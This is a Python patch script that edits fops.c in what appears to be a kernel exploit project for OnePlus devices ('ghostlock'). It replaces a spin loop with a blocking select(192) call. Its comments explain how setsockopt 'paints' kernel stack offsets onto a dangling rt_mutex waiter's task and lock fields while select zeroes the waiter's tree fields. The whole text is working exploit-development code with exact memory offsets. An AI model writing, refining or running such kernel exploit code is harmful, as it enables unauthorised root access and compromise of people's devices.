fops = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(fops).read()

old = '''    atomic_store(&pselect_select_done, 1);
    atomic_store(&punch_consume_go, attempt);
    /* Park in USERSPACE: any syscall here (nanosleep goes ~0x1b0 deep, file
     * write even deeper) would overwrite the shallow paint at SP0-0x1c0..0x160
     * (task@-0x180, lock@-0x178).  No syscall until the consumer has walked. */
    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }'''

new = '''    atomic_store(&pselect_select_done, 1);
    atomic_store(&punch_consume_go, attempt);
    /* Constructive fix (setsockopt + blocking select):
     *  - setsockopt already painted waiter->task (buf[0x40]) and waiter->lock
     *    (buf[0x48]); those are at SP0-0x180 / SP0-0x178 == bits words 18 / 19.
     *  - Now stay INSIDE the kernel so the syscall-exit path cannot clobber the
     *    paint, AND zero the dangling waiter's tree_entry/pi_tree.
     *  - select(192) -> core_sys_select(n=192) processes exactly
     *    FDS_LONGS(192)=3 longs/set * 6 sets = 18 stack words at
     *    bits = SP0-0x210 == words 0..17 == SP0-0x210..SP0-0x188.  Since
     *    waiter = SP0-0x1b0 = bits word 12, this zeroes waiter+0x00..0x2f
     *    (tree_entry@0x00 + pi_tree@0x18) while words 18/19 (task@0x30 /
     *    lock@0x38) are NOT processed -> the setsockopt paint survives. */
    {
      fd_set blk_in, blk_out, blk_ex;
      FD_ZERO(&blk_in); FD_ZERO(&blk_out); FD_ZERO(&blk_ex);
      struct timeval blk_tv = { .tv_sec = 0, .tv_usec = 300000 };
      select(192, &blk_in, &blk_out, &blk_ex, &blk_tv);
    }
    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }'''

assert s.count(old) == 1, ('anchor', s.count(old))
s = s.replace(old, new, 1)
open(fops, "w").write(s)
print("setsockopt + blocking select patched")
